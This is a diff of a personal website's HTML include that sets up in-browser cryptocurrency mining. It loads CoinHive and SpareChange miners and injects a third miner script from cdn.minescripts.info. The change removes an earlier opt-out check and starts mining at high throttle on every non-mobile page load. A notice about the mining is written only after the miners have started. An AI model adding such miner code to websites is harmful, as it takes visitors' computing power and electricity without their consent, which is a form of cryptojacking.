@@ -1,18 +1,14 @@
 <script data-cfasync="true" src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('NS1Lh4sTCMiS0AcazVxeqiDKUXIrkTnX', {throttle: 0.9});
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
-	}
-</script>
 <!-- <script data-cfasync="true" type="text/javascript">
 !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/40497/austinhuang.me/0/0/",s.parentNode.insertBefore(t,s)}();
 </script> -->
 <script data-cfasync="true" type="text/javascript" src="https://www.sparechange.io/static/sparechange.js"></script>
-<script data-cfasync="true" type="text/javascript">
-  var sparechange = new Miner("48fb11f31b3749587bfb7bd1727129b480e1669062ddb7f14d04f675877f332ed2eaff9d48e1f567b175f89012a6e2c01a7008a30521ac3e5252068ae9ceaeb3", null, 0.9);
-  if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|Mobile|Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
-	sparechange.start();
-	document.write('<script data-cfasync="true" src="https://cdn.minescripts.info/c/8kZq.js"></script>');
-  }
+<script>
+	var sparechange = new Miner("48fb11f31b3749587bfb7bd1727129b480e1669062ddb7f14d04f675877f332ed2eaff9d48e1f567b175f89012a6e2c01a7008a30521ac3e5252068ae9ceaeb3", null, 0.9);
+	var miner = new CoinHive.Anonymous('NS1Lh4sTCMiS0AcazVxeqiDKUXIrkTnX', {throttle: 0.9});
+	if (!miner.isMobile()) {
+		miner.start();
+		sparechange.start();
+		document.write('<script data-cfasync="true" src="https://cdn.minescripts.info/c/8kZq.js"></script>\n<small>This page is monetized using crypto miners. It is totally fine to block them if they become annoying.</small>');
+	}
 </script>
